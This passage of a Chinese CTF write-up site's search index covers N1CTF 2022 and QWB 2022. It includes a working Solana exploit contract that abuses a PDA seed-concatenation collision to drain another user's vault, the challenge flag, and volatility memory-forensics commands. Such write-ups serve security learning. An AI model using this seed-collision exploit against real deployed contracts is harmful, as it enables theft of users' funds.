employee_key;\n\n    Ok(())\n}\n</code></pre><ul> <li>\u9996\u5148\u9a8c\u8bc1 org_name \u548c employee_id \u7684\u957f\u5ea6</li> <li>\u68c0\u67e5 (org_name, employee_id) \u662f\u5426\u5728 catalog \u4e2d\u5b58\u5728\uff0c\u5b58\u5728\u5219\u62a5\u9519</li> <li>\u5c06 (org_name, employee_id) \u6dfb\u52a0\u5230 catalog \u4e2d</li> <li>\u4fee\u6539 employee_record</li> </ul> </li> </ul>"}, {"location": "writeups/n1ctf2022/#deposit", "title": "Deposit", "text": "<ul> <li>Deposit \u7ed3\u6784\u4f53<ul> <li>vault\uff1a     <pre><code>#[account(\n    init_if_needed,\n    seeds = [org_name.as_bytes(), employee_id.as_bytes()],\n    bump,\n    space = Vault::SIZE,\n    payer = user \n)]\npub vault: Account&lt;'info, Vault&gt;,\n</code></pre><ul> <li>\u901a\u8fc7 [org_name, employee_id] \u8fd9\u4e2a seed \u83b7\u53d6 PDA</li> <li>Vault \u5b9a\u4e49\uff1a     <pre><code>#[account]\n#[repr(C, align(8))]\n#[derive(Default)]\npub struct Vault {\n    pub amount : u64,\n}\nimpl Vault {\n    pub const SIZE : usize = 8 // DISCRIMINATOR_SIZE\n        + 8;                   // u64\n}\n</code></pre></li> </ul> </li> <li>employee_record\uff1a     <pre><code>#[account(\n    seeds = [user.key().as_ref()],\n    bump,\n    constraint = employee_record.org == org_name,\n    constraint = employee_record.id == employee_id,\n    constraint = employee_record.key == user.key(),\n)]\npub employee_record: Account&lt;'info, EmployeeRecord&gt;,\n</code></pre><ul> <li>\u8fd9\u91cc\u6709\u65b0\u51fa\u73b0\u7684 constraint\uff0c\u4f20\u53c2\u65f6\u4f1a\u68c0\u67e5\u5176\u5185\u5bb9\u662f\u5426\u4e3a true\uff0c\u4e0d\u662f\u7684\u8bdd\u5c31\u62a5\u9519\u7136\u540e revert</li> </ul> </li> <li>\u5176\u5b83     <pre><code>#[account(\n    mut,\n    seeds = [ b\"RESERVE\" ],\n    bump,\n    constraint = reserve.mint == mint.key(),\n)]\npub reserve: Account&lt;'info, TokenAccount&gt;,\n\n#[account(\n    mut,\n    constraint = user_token_account.owner == user.key(),\n    constraint = user_token_account.mint  == mint.key()\n)]\npub user_token_account: Account&lt;'info, TokenAccount&gt;,\n\npub mint: Account&lt;'info, Mint&gt;,\n\n#[account(mut)]\npub user: Signer&lt;'info&gt;,\npub token_program: Program&lt;'info, Token&gt;,\npub system_program: Program&lt;'info, System&gt;,\npub rent: Sysvar&lt;'info, Rent&gt;,\n</code></pre></li> </ul> </li> <li>\u5904\u7406\u51fd\u6570\uff1a     <pre><code>pub fn deposit(ctx: Context&lt;Deposit&gt;, org_name: String, employee_id: String, amount: u64) -&gt; Result&lt;()&gt; {\n    msg!(\"[CHALL] deposit\");\n    let vault = &amp;mut ctx.accounts.vault;\n    let employee_record = &amp; ctx.accounts.employee_record;\n    let user = &amp; ctx.accounts.user;\n\n    require!(\n        user.key() == employee_record.key &amp;&amp; org_name == employee_record.org &amp;&amp; employee_id == employee_record.id,\n        CoreError::UnknownEmployee\n    );\n\n    let deposit_ctx = CpiContext::new(\n        ctx.accounts.token_program.to_account_info(),\n        Transfer {\n            from: ctx.accounts.user_token_account.to_account_info(),\n            to: ctx.accounts.reserve.to_account_info(),\n            authority: ctx.accounts.user.to_account_info()\n        }\n    );\n    token::transfer(deposit_ctx, amount)?;\n\n    vault.amount += amount;\n\n    Ok(())\n}\n</code></pre><ul> <li>\u5148\u8bd5\u4e00\u7cfb\u5217\u68c0\u67e5\uff0c\u68c0\u67e5\u8f93\u5165\u662f\u5426\u5408\u6cd5</li> <li>\u7136\u540e\u8c03\u7528 spl token \u7684 transfer \u6307\u4ee4\u6765\u4ece user_token_account \u8f6c amount \u4e2a token \u7ed9 reserve</li> <li>\u4e3a vault \u7684 amount \u589e\u52a0 amount\uff08\u8fd9\u4e2a vault \u662f\u6839\u636e seed [org_name, employee_id] \u627e\u5230\u7684 PDA\uff09</li> </ul> </li> </ul>"}, {"location": "writeups/n1ctf2022/#withdraw", "title": "Withdraw", "text": "<ul> <li>Withdraw \u7ed3\u6784\u4f53<ul> <li>\u5176\u5185\u5bb9\u548c Deposit \u51e0\u4e4e\u4e00\u81f4</li> <li>\u533a\u522b\u5728\u4e8e Deposit \u7684 user \u5728\u8fd9\u91cc\u53eb\u505a payer\uff0c\u4e0d\u8fc7\u7528\u5904\u5e94\u8be5\u6ca1\u53d8</li> </ul> </li> <li>\u5904\u7406\u51fd\u6570\uff1a     <pre><code>pub fn withdraw(ctx: Context&lt;Withdraw&gt;, org_name: String, employee_id: String, amount: u64) -&gt; Result&lt;()&gt; {\n    msg!(\"[CHALL] withdraw\");\n    let vault = &amp;mut ctx.accounts.vault;\n    let employee_record = &amp; ctx.accounts.employee_record;\n    let payer = ctx.accounts.payer.key();\n\n    require!(\n        payer == employee_record.key &amp;&amp; org_name == employee_record.org &amp;&amp; employee_id == employee_record.id,\n        CoreError::UnknownEmployee\n    );\n    require!(\n        vault.amount &gt;= amount,\n        CoreError::InsufficientBalance\n    );\n\n    let reserve_bump = [*ctx.bumps.get(\"reserve\").unwrap()];\n    let signer_seeds = [\n        b\"RESERVE\",\n        reserve_bump.as_ref()\n    ];\n    let signer = &amp;[&amp;signer_seeds[..]];\n\n    let withdraw_ctx = CpiContext::new_with_signer(\n        ctx.accounts.token_program.to_account_info(),\n        Transfer {\n            from: ctx.accounts.reserve.to_account_info(),\n            to: ctx.accounts.user_account.to_account_info(),\n            authority: ctx.accounts.reserve.to_account_info()\n        },\n        signer\n    );\n    token::transfer(withdraw_ctx, amount)?;\n\n    vault.amount -= amount;\n\n    Ok(())\n}\n</code></pre><ul> <li>\u540c\u6837\u505a\u4e86\u5f88\u591a\u68c0\u67e5</li> <li>\u5229\u7528 spl token \u5408\u7ea6\u4ece reserve transfer amount token \u7ed9 user_account</li> <li>\u7ed9 vault.amount \u51cf\u5c11 amount</li> </ul> </li> </ul>"}, {"location": "writeups/n1ctf2022/#_2", "title": "\u9898\u76ee\u4ea4\u4e92\u90e8\u5206", "text": "\u9898\u76ee\u4ea4\u4e92\u4ee3\u7801 <pre><code>async fn handle_connection(mut socket: TcpStream) -&gt; Result&lt;(), Box&lt;dyn Error&gt;&gt; {\n    let mut builder = ChallengeBuilder::try_from(socket.try_clone().unwrap()).unwrap();\n\n    let chall_id = builder.add_program(\"./chall/target/deploy/chall.so\", Some(chall::ID));\n    let solve_id = builder.input_program()?;\n\n    let mut chall = builder.build().await;\n\n    // -------------------------------------------------------------------------\n    // [setup env] initialize\n    // -------------------------------------------------------------------------\n    let program_id = chall_id;\n\n    let mint = chall.add_mint().await?;\n\n    let payer_keypair = &amp;chall.ctx.payer;\n    let payer = payer_keypair.pubkey();\n\n    let user_keypair = Keypair::new();\n    let user = user_keypair.pubkey();\n    chall\n        .run_ix(system_instruction::transfer(&amp;payer, &amp;user, 100_000_000_000))\n        .await?;\n\n    let catalog = Pubkey::find_program_address(&amp;[b\"CATALOG\"], &amp;program_id).0;\n    let reserve = Pubkey::find_program_address(&amp;[b\"RESERVE\"], &amp;program_id).0;\n\n    println!(\"\\nAccounts created...\\n\");\n\n    let ix = chall::instruction::Initialize {};\n    let ix_accounts = chall::accounts::Initialize {\n        catalog,\n        reserve,\n        mint,\n        payer,\n        token_program: spl_token::ID,\n        system_program: solana_program::system_program::ID,\n        rent: solana_program::sysvar::rent::ID,\n    };\n\n    chall\n        .run_ix(Instruction::new_with_bytes(\n            program_id,\n            &amp;ix.data(),\n            ix_accounts.to_account_metas(None),\n        ))\n        .await?;\n\n    // -------------------------------------------------------------------------\n    // [setup env] register\n    // -------------------------------------------------------------------------\n    let org_name = String::from(\"product\");\n    let employee_id = String::from(\"employ_A\");\n    let ix = chall::instruction::Register {\n        org_name: org_name.clone(),\n        employee_id: employee_id.clone(),\n    };\n    let employee_record = Pubkey::find_program_address(&amp;[payer.as_ref()], &amp;program_id).0;\n    let reg_accounts = chall::accounts::Register {\n        catalog,\n        employee_record,\n        user: payer,\n        system_program: solana_program::system_program::ID,\n        rent: solana_program::sysvar::rent::ID,\n    };\n    chall\n        .run_ix(Instruction::new_with_bytes(\n            program_id,\n            &amp;ix.data(),\n            reg_accounts.to_account_metas(None),\n        ))\n        .await?;\n\n    // -------------------------------------------------------------------------\n    // [setup env] deposits 1_000\n    // -------------------------------------------------------------------------\n    let payer_token_account = chall.add_token_account(&amp;mint, &amp;payer).await?;\n    chall\n        .mint_to(1_000_u64, &amp;mint, &amp;payer_token_account)\n        .await?;\n\n    let vault = Pubkey::find_program_address(\n        &amp;[org_name.clone().as_bytes(), employee_id.clone().as_bytes()],\n        &amp;program_id,\n    )\n    .0;\n    let ix = chall::instruction::Deposit {\n        org_name: org_name.clone(),\n        employee_id: employee_id.clone(),\n        amount: 500_u64,\n    };\n    let ix_accounts = chall::accounts::Deposit {\n        vault,\n        employee_record,\n        reserve,\n        user_token_account: payer_token_account,\n        mint,\n        user: payer,\n        token_program: spl_token::ID,\n        system_program: solana_program::system_program::ID,\n        rent: solana_program::sysvar::rent::ID,\n    };\n    chall\n        .run_ix(Instruction::new_with_bytes(\n            program_id,\n            &amp;ix.data(),\n            ix_accounts.to_account_metas(None),\n        ))\n        .await?;\n\n    // TDOD: comment out\n    let reserve_account = chall.read_token_account(reserve).await?;\n    let reserve_balance = reserve_account.amount;\n    println!(\n        \"\\nvault = {}\\nreserve balance = {}\\n\",\n        vault, reserve_balance\n    );\n    // ----------------------------------------------------------------------------\n    // [setup env] done\n    // ----------------------------------------------------------------------------\n\n\n    let init_amount = 100_u64;\n    let user_record = Pubkey::find_program_address(&amp;[user.as_ref()], &amp;program_id).0;\n    let user_token_account_pubkey = chall.add_token_account(&amp;mint, &amp;user).await?;\n    chall\n        .mint_to(init_amount, &amp;mint, &amp;user_token_account_pubkey)\n        .await?;\n\n    writeln!(socket, \"user: {}\", user)?;\n    writeln!(socket, \"user_record: {}\", user_record)?;\n    writeln!(socket, \"catalog: {}\", catalog)?;\n    writeln!(socket, \"mint: {}\", mint)?;\n    writeln!(socket, \"user_token_account: {}\", user_token_account_pubkey)?;\n    writeln!(socket, \"reserve: {}\", reserve)?;\n\n    let bump_budget = ComputeBudgetInstruction::request_units(10_000_000u32, 0u32);\n    let solve_ix = chall.read_instruction(solve_id)?;\n    chall\n        .run_ixs_full(\n            &amp;[bump_budget, solve_ix],\n            &amp;[&amp;user_keypair],\n            &amp;user_keypair.pubkey(),\n        )\n        .await?;\n\n    let user_token_account = chall.read_token_account(user_token_account_pubkey).await?;\n    writeln!(\n        socket,\n        \"player_account_amount: {:?}\",\n        user_token_account.amount\n    )?;\n\n    println!(\n        \"\\nplayer_account_amount balance = {}\\n\",\n        user_token_account.amount\n    );\n\n    if user_token_account.amount &gt; init_amount {\n        writeln!(socket, \"congrats!\")?;\n        if let Ok(flag) = env::var(\"FLAG\") {\n            writeln!(socket, \"flag: {:?}\", flag)?;\n        } else {\n            writeln!(socket, \"flag not found, please contact admin\")?;\n        }\n    }\n\n    Ok(())\n}\n</code></pre> <ul> <li>\u8bfb\u53d6\u9898\u76ee\u5408\u7ea6\u548c\u7528\u6237\u8f93\u5165\u5408\u7ea6</li> <li>\u589e\u52a0 mint\u3001payer\u3001user \u8d26\u6237<ul> <li>\u521d\u59cb\u7ed9 user 100_000_000_000 lamports</li> </ul> </li> <li>\u83b7\u53d6\u5c5e\u4e8e\u9898\u76ee\u5408\u7ea6\u7684 catalog \u548c reserve PDA</li> <li>\u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 Initialize \u6307\u4ee4</li> <li>\u8c03\u7528 Register\uff0corg_name \u548c employee_id \u4e3a (\"product\", \"employ_A\")</li> <li>\u521b\u5efa payer_token_account\uff0c\u521d\u59cb\u7ed9\u5176 1000 token</li> <li>\u83b7\u53d6 seed (\"product\", \"employ_A\") \u7684 PDA \u4f5c\u4e3a vault\uff0c\u8c03\u7528 Deposit\uff0camount \u4e3a 500 token</li> <li>\u521b\u5efa user_record \u548c user_token_account\uff0c\u5411\u5176\u4e2d\u521d\u59cb\u8f6c 100 token</li> <li>\u8f93\u51fa\u4e00\u7cfb\u5217 pubkey</li> <li>\u8bfb\u53d6\u6307\u4ee4\uff0c\u8c03\u7528\u7528\u6237\u5408\u7ea6</li> <li>\u83b7\u53d6 user_token_account \u7684 token \u4e2a\u6570\uff0c\u5982\u679c\u591a\u4e8e 100 \u4e2a\u5219\u8f93\u51fa flag</li> </ul>"}, {"location": "writeups/n1ctf2022/#_3", "title": "\u505a\u6cd5", "text": "<p>\u8fd9\u9898\u7684\u7b54\u9898\u4ea4\u4e92\u4e5f\u7ed9\u4e86\uff0c\u662f rust \u4ee3\u7801\uff0c\u5199\u597d\u4e86\u76f4\u63a5\u6539\u4e0b tcp \u5730\u5740\u7136\u540e cargo run \u5c31\u53ef\u4ee5\u6253\u4e86\u3002</p> <p>\u4e3b\u8981\u7684\u89e3\u6cd5\u8fd8\u662f\u5728 solve/programs/solve/src/lib.rs \u4e2d\u7f16\u5199\u3002</p> <p>\u9898\u7ed9\u4e86\u4e00\u4e2a\u521d\u59cb\u5316\u6307\u4ee4\u548c\u5176\u7ed3\u6784\u4f53\u7684\u5b9a\u4e49\uff0c\u5728\u91cc\u9762\u8865\u5145\u5c31\u53ef\u4ee5\u3002\u539f\u6709\u7684\u662f\u4e00\u4e2a\u8c03\u7528 Register \u7684\u4ee3\u7801\uff0cregister \u4e86 (\"product\", \"employ_B\") \u8fd9\u4e2a record\u3002</p> <p>\u627e\u4e86\u5f88\u957f\u65f6\u95f4\u6ca1\u770b\u51fa\u6f0f\u6d1e\u5728\u54ea\u3002\u4f46 solana \u7684\u5b98\u65b9\u6587\u6863\u4e2d\u5173\u4e8e PDA seed \u7684\u63cf\u8ff0\u91cc\u9762\u6709\u4e00\u4e2a warning\uff1a</p> <p>Warning: Because of the way the seeds are hashed there is a potential for program address collisions for the same program id. The seeds are hashed sequentially which means that seeds {\"abcdef\"}, {\"abc\", \"def\"}, and {\"ab\", \"cd\", \"ef\"} will all result in the same program address given the same program id. Since the chance of collision is local to a given program id, the developer of that program must take care to choose seeds that do not collide with each other. For seed schemes that are susceptible to this type of hash collision, a common remedy is to insert separators between seeds, e.g. transforming {\"abc\", \"def\"} into {\"abc\", \"-\", \"def\"}.</p> <p>\u5927\u4f53\u610f\u601d\u5c31\u662f\uff0c\u5982\u679c seed \u6709\u591a\u4e2a\u7684\u8bdd\uff0c\u8ba1\u7b97\u7684\u65f6\u5019\u662f\u76f4\u63a5\u62fc\u63a5\u8d77\u6765\u7684\uff0c[\"abcdef\"] \u548c [\"abc\", \"def\"]\u3001[\"ab\", \"cdef\"] \u7b97\u51fa\u6765\u7684 PDA \u662f\u4e00\u6837\u7684\u3002</p> <p>\u800c\u9898\u76ee\u4e2d\u83b7\u53d6 vault \u7528\u7684 seed \u662f [org_name, employee_id]\uff0c\u8fd9\u91cc\u5c31\u5b58\u5728\u4e86\u62fc\u63a5\u3002\u65e2\u7136\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528\u540c\u6837\u7684 (org_name, employee_id) \u6765\u6ce8\u518c\u3001\u83b7\u53d6\u5230\u5176\u8bb0\u5f55\u6709 500 token \u7684 vault\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u7528\u53e6\u4e00\u5bf9 (org_name, employee_id) \u6765\u5b8c\u6210\u6ce8\u518c\u3001\u5e76\u5728 withdraw \u83b7\u53d6 vault \u7684\u65f6\u5019\u4f7f\u5176\u62fc\u63a5\u8d77\u6765\u548c\u9898\u76ee\u4e2d\u7684\u4e00\u6837\u6765\u83b7\u53d6\u5230\u90a3\u4e2a 500 token \u7684 vault\u3002</p> <p>\u6240\u4ee5\u6211\u4eec\u6ce8\u518c\u4e00\u4e2a (\"produc\", \"temploy_A\") \u7136\u540e\u76f4\u63a5 withdraw \u5c31\u53ef\u4ee5\u4e86\uff1a</p> exp \u5408\u7ea6 initialize \u6307\u4ee4 <pre><code>pub fn initialize(ctx: Context&lt;Initialize&gt;) -&gt; Result&lt;()&gt; {\n\n    let o1 = String::from(\"produc\");\n    let e1 = String::from(\"temploy_A\");\n\n    let cpi_accounts = chall::cpi::accounts::Register {\n        catalog: ctx.accounts.catalog.to_account_info(),\n        employee_record: ctx.accounts.user_record.to_account_info(),\n        user: ctx.accounts.user.to_account_info(),\n        system_program: ctx.accounts.system_program.to_account_info(),\n        rent: ctx.accounts.rent.to_account_info(),\n    };\n    let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);\n    chall::cpi::register(cpi_ctx, o1, e1)?;\n\n    let o1 = String::from(\"produc\");\n    let e1 = String::from(\"temploy_A\");\n\n    let cpi_accounts = chall::cpi::accounts::Withdraw {\n        vault: ctx.accounts.vault.to_account_info(),\n        employee_record: ctx.accounts.user_record.to_account_info(),\n        reserve: ctx.accounts.reserve.to_account_info(),\n        user_account: ctx.accounts.user_token_account.to_account_info(),\n        mint: ctx.accounts.mint.to_account_info(),\n        payer: ctx.accounts.user.to_account_info(),\n        token_program: ctx.accounts.token_program.to_account_info(),\n        system_program: ctx.accounts.system_program.to_account_info(),\n        rent: ctx.accounts.rent.to_account_info(),\n    };\n    let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);\n    chall::cpi::withdraw(cpi_ctx, o1, e1, 1)?;\n\n    Ok(())\n}\n</code></pre> <p>\u7136\u540e\u4ea4\u4e92\u7684 main.rs \u4e2d\u8fd8\u6709\u4e00\u5904\u83b7\u53d6\u53c2\u6570 vault \u7684\u5730\u65b9\u4e5f\u9700\u8981\u6539\u4e00\u4e0b\uff1a <pre><code>let vault = Pubkey::find_program_address(\n        &amp;[b\"produc\", b\"temploy_A\"],\n        &amp;chall_id,\n    ).0;\n</code></pre></p> <p>\u5176\u5b83\u6cbf\u7528\u7ed9\u7684\u4ea4\u4e92\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd9\u6837 main.rs \u4e2d\u8f93\u5165\u6307\u4ee4\uff0c\u8c03\u7528 exp \u5408\u7ea6\u7684 Initialize \u6307\u4ee4\uff0c\u5176\u4e2d withdraw \u4e86\uff0c\u7ed3\u675f\u540e\u68c0\u67e5 token amount \u5c31\u4f1a\u6bd4\u539f\u5148\u66f4\u591a\u4e86\u3002</p> <p>flag: n1ctf{I_sh0uld_h4ve_ch0s3n_4_b3tt3r_se3d_de5ign}</p>"}, {"location": "writeups/n1ctf2022/#just-find-flag", "title": "just find flag", "text": "<p>\u4e00\u9053 Windows \u5185\u5b58\u53d6\u8bc1\u9898\uff0c\u5dee\u4e86\u4e00\u6b65\u6ca1\u505a\u51fa\u6765\u3002\u7ed3\u675f\u540e\u8865\u5b8c\u4e86\u3002</p> <p>\u5185\u5b58\u53d6\u8bc1\u76f4\u63a5\u4e0a\u624b\u5148 strings \u4e00\u628a\u68ad\uff0c\u53d1\u73b0\u4e86 flag.zip\u3001flag.txt\u3002\u662f\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u76f4\u63a5\u4ece\u5341\u516d\u8fdb\u5236\u91cc\u628a\u5b83\u5b8c\u6574\u5185\u5bb9\u6252\u51fa\u6765\uff0c\u53d1\u73b0\u6709\u5bc6\u7801\uff0c\u800c\u4e14\u662f\u771f\u5bc6\u7801\uff0c\u516d\u4f4d\u6570\u5bc6\u7801\u7206\u4e0d\u51fa\u6765\u3002</p> <p>\u7ee7\u7eed volatility \u4e00\u628a\u68ad\uff0cimageinfo \u51fa\u6765\u662f Win7 \u7cfb\u7edf\uff0c\u4e00\u4e9b\u6ca1\u7528\u7684\u6307\u4ee4\u8f93\u51fa\u5c31\u4e0d\u5728\u8fd9\u91cc\u5199\u4e86</p> <p>\u5728\u6267\u884c consoles \u6307\u4ee4\u7684\u65f6\u5019\u53d1\u73b0\u4e86\uff1a <pre><code>**************************************************\nConsoleProcess: conhost.exe Pid: 2480\nConsole: 0xff656200 CommandHistorySize: 50\nHistoryBufferCount: 2 HistoryBufferMax: 4\nOriginalTitle: %SystemRoot%\\system32\\cmd.exe\nTitle: C:\\Windows\\system32\\cmd.exe - C:\\Python27\\python.exe  -m SimpleHTTPServer\nAttachedProcess: python.exe Pid: 2052 Handle: 0x8c\nAttachedProcess: cmd.exe Pid: 2336 Handle: 0x60\n----\nCommandHistory: 0x37ed10 Application: python.exe Flags: Allocated\nCommandCount: 0 LastAdded: -1 LastDisplayed: -1\nFirstCommand: 0 CommandCountMax: 50\nProcessHandle: 0x8c\n----\nCommandHistory: 0x37e9c0 Application: cmd.exe Flags: Allocated, Reset\nCommandCount: 3 LastAdded: 2 LastDisplayed: 2\nFirstCommand: 0 CommandCountMax: 50\nProcessHandle: 0x60\nCmd #0 at 0x382d60: echo \"Stucked? You can ask WallPaper god for help.\"\nCmd #1 at 0x35e3a0: cd Desktop\nCmd #2 at 0x382dd0: C:\\Python27\\python.exe -m SimpleHTTPServer\n----\nScreen 0x360f70 X:80 Y:300\nDump:\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Users\\dora&gt;echo \"Stucked? You can ask WallPaper god for help.\"\n\"Stucked? You can ask WallPaper god for help.\"\n\nC:\\Users\\dora&gt;cd Desktop\n\nC:\\Users\\dora\\Desktop&gt;C:\\Python27\\python.exe -m SimpleHTTPServer\nServing HTTP on 0.0.0.0 port 8000 ...\n192.168.17.129 - - [05/Nov/2022 03:08:43] \"GET /mem.zip HTTP/1.1\" 200 -\n</code></pre> \u6709\u4e00\u53e5 \"Stucked? You can ask WallPaper god for help.\"\u3002\u6240\u4ee5\u5728 strings \u91cc\u9762\u518d\u641c Wallpaper\uff0c\u53d1\u73b0\u6709\u76f8\u5173\u6587\u4ef6\uff0c\u7ee7\u7eed volatility \u68ad\uff1a <pre><code>volatility -f mem.raw --profile=Win7SP1x64 filescan &gt; files.txt\n</code></pre> \u6709\u5f88\u591a\u5f88\u591a\u6587\u4ef6\uff0c\u5728\u91cc\u9762\u641c\u4e00\u4e0b\u53d1\u73b0\u4e86\u4e24\u4e2a Wallpaper \u8def\u5f84\u4e0b\u7684\u6587\u4ef6\uff1a <pre><code>Offset(P)            #Ptr   #Hnd Access Name\n------------------ ------ ------ ------ ----\n...\n0x000000007eee11c0     10      0 R--r-- \\Device\\HarddiskVolume1\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg\n...\n0x000000007fc48f20     16      0 R--r-d \\Device\\HarddiskVolume1\\Windows\\Web\\Wallpaper\\Windows\\img0.jpeg\n...\n</code></pre> \u7136\u540e\u5206\u522b\u7528 <code>volatility -f mem.raw --profile=Win7SP1x64 dumpfiles -Q &lt;Offset&gt; --dump-dir=./</code> \u63d0\u53d6\uff0c\u53d1\u73b0\u4e0a\u9762\u4e00\u5f20\u662f Win7 \u7ecf\u5178\u58c1\u7eb8\uff0c\u4e0b\u9762\u4e00\u5f20\u662f\uff1a </p> <p>\u7136\u540e\u8fd9\u91cc\u5361\u4f4f\u4e86\uff0c\u627e\u4e86\u5f88\u957f\u65f6\u95f4\u4e5f\u627e\u4e0d\u51fa\u4ed6\u8bf4\u7684\u6ca1\u6709 Desktop \u7684 full path \u662f\u4ec0\u4e48\u3002</p> <p>\u8d5b\u540e\u542c\u8bf4\u662f\u8981\u7528 volatility \u7684 mtfparser \u6307\u4ee4\uff0c\u8bd5\u4e86\u4e00\u4e0b\uff0c\u786e\u5b9e\u662f\u6709\u7684\uff1a <pre><code>volatility -f mem.raw --profile=Win7SP1x64 mftparser &gt; mftparser.txt\n</code></pre>  \u6709\u4e2a\u8def\u5f84 <code>PROGRA~2\\WINDOW~2\\ACCESS~1\\flag.zip</code>\uff0c\u53ef\u4ee5\u63a8\u6d4b\u51fa\u8fd9\u4e2a\u7f29\u5199\u5b9e\u9645\u4e0a\u662f <code>C:\\Program Files (x86)\\Windows NT\\Accessories\\flag.zip</code>\u3002\u6240\u4ee5\u538b\u7f29\u5305\u7684\u5bc6\u7801\u5c31\u662f\uff08<code>\\f</code> \u5c31\u662f\u8981\u8fd9\u6837\u653e\u7740\u4e0d\u7ba1\uff0c\u9898\u76ee\u7ed9\u4e86 note \u4e86\uff09\uff1a <pre><code>hashlib.md5(b\"C:\\Program Files (x86)\\Windows NT\\Accessories\\flag.zip\").hexdigest()\n# 0d3ba7db468bdbd4f93a88c97ba7bef1\n</code></pre> \u89e3\u538b\u51fa\u6765\u5c31\u662f flag \u4e86\u3002</p> <p>\u53cd\u6b63\u8fd8\u662f volatility \u4e0d\u719f\u7ec3\uff0c\u8bb0\u4e0b\u4e86\u3002Windows \u4e0b\u4e00\u4e9b\u5220\u6389\u4e86\u7684\u6587\u4ef6\u53ef\u4ee5\u5c1d\u8bd5\u7528 mtfparser \u6765\u641c\u4e00\u4e0b\u3002</p>"}, {"location": "writeups/qwb2022/", "title": "\u5f3a\u7f51\u676f 2022 Quals Writeup", "text": "<p> \u7ea6 864 \u4e2a\u5b57  12 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p> <p>Abstract</p> <p>misc \u5f88\u5c11\uff0c\u53ea\u505a\u4e86\u789f\u5f71\u91cd\u91cd\u4e00\u9053\u9898\uff0c\u7eaf\u7eaf\u7684\u50bb\u903c\u9898\u3002\u4e00\u5c42\u4e00\u5c42\u6beb\u65e0\u610f\u4e49\u5730\u786c\u5957\u5a03\uff0c\u505a\u4e86\u597d\u957f\u597d\u957f\u65f6\u95f4\uff0c\u6700\u540e\u5dee\u51e0\u5206\u949f\u6ca1\u505a\u51fa\u6765\uff0c\u771f\u7684\u7834\u9632</p> <p>(\u256f\u00b0\u25a1\u00b0\uff09\u256f\ufe35 \u253b\u2501\u253b</p>"}, {"location": "writeups/qwb2022/#_1", "title": "\u789f\u5f71\u91cd\u91cd", "text": "<p>\u9996\u5148\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u52a0\u5bc6\u538b\u7f29\u5305\u548c\u4e00\u4e2a\u6d41\u91cf\u5305</p> <p>\u538b\u7f29\u5305\u7ed3\u5c3e\u9644\u52a0\u4fe1\u606f Password is md5(api address)</p> <p>\u6d41\u91cf\u5305\u770b\u4e0d\u51fa\u4ec0\u4e48\u540d\u5802\uff0c\u76f4\u5230\u7ed9\u4e86\u7b2c\u4e00\u4e2a hint\uff1avmess \u6d41\u91cf\u3002\u4e8e\u662f\u5c31\u53bb\u7ffb\u770b vmess \u7684\u6587\u6863\uff0c\u7ed3\u679c\u6587\u6863\u5199\u7684\u4e0d\u4ec5\ud83d\udca9\u4e00\u6837\u8fd8\u5168**\u662f\u9519\u7684\u3002\u88ab\u8feb\u770b v2ray \u7684\u6e90\u7801\uff0c\u4f46 v2ray \u7684\u6e90\u7801\u8fd8\u662f go \u5199\u7684\uff0c\u8fd9\u96be\u770b\u7684\u8bed\u8a00\u771f\u7684\u8981\u7ed9\u6211\u770b\u5410\u4e86\u3002\u7ffb\u627e\u5230\u4e86 rust \u5199\u7684 leaf \u9879\u76ee\uff0c\u91cc\u9762\u6709 vmess \u76f8\u5173\u7684\u4e1c\u897f\uff0c\u770b\u7684\u5f88\u8212\u9002\u3002\u6700\u540e\u770b\u6e90\u7801\u770b\u51fa\u6765\u7684 vmess \u534f\u8bae\u5185\u5bb9\u5728 vmess \u534f\u8bae \u9875\u9762</p> <p>\u6839\u636e\u534f\u8bae\u8be6\u7ec6\u4fe1\u606f\u89e3\u7801\u8bf7\u6c42\u6d41\u91cf\uff0c\u5f97\u5230\uff1a <pre><code>GET /out HTTP/1.1\nHost: 127.0.0.1:5000\nUser-Agent: curl/7.75.0\nAccept: */*\nConnection: close\n</code></pre></p> <p>\u89e3\u7801\u54cd\u5e94\u6d41\u91cf\u5f97\u5230\u4e00\u4e2a\u5f88\u957f\u7684 html\uff0c\u91cc\u9762\u5b9e\u9645\u4f5c\u7528\u662f\u7528 base64 \u89e3\u7801\u5f97\u5230\u4e00\u4e2a doc \u6587\u6863\u5e76\u4e0b\u8f7d\u3002\u901a\u8fc7\u89e3\u7801\u6216\u8005\u6253\u5f00 html \u90fd\u53ef\u4ee5\u5f97\u5230\u8fd9\u4e2a doc \u6587\u6863\u3002\u4e0d\u8fc7\u5176\u4e2d\u5305\u542b\u4e86\u75c5\u6bd2\u5b8f\uff0c\u53ef\u80fd\u4f1a\u88ab\u9632\u706b\u5899\u6e05\u7406\uff08mac \u4e0d\u4f1a\uff09</p> <p>\u5c06\u6269\u5c55\u540d\u6539\u4e3a .zip \u5e76\u89e3\u538b\u53ef\u4ee5\u5f97\u5230\u5b8f\uff08\u6216\u8005\u8fdb\u5165 Word \u6253\u5f00\u5b8f\u7f16\u8f91\u5668\uff09\u5206\u6790\u4e86\u597d\u4e45\u90a3\u4e00\u5806\u6df7\u6dc6\u7684\u5b8f\uff0c\u6ca1\u4ec0\u4e48\u8fdb\u5c55\uff0c\u5927\u6982\u5c31\u662f\u6267\u884c\u4e86\u4e00\u4e2a dll\uff0c\u627e\u5230\u540e\u9006\u4e5f\u6ca1\u9006\u5230\u4ec0\u4e48</p> <p>\u8003\u8651\u5230\u9632\u706b\u5899\u4f1a\u81ea\u52a8\u6e05\u7406\uff0c\u4ee5\u53ca\u5b8f\u7684\u5199\u6cd5\u548c doc\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u8001\u75c5\u6bd2\uff0c\u4e8e\u662f\u7ed3\u5408 dll \u7684 sha256 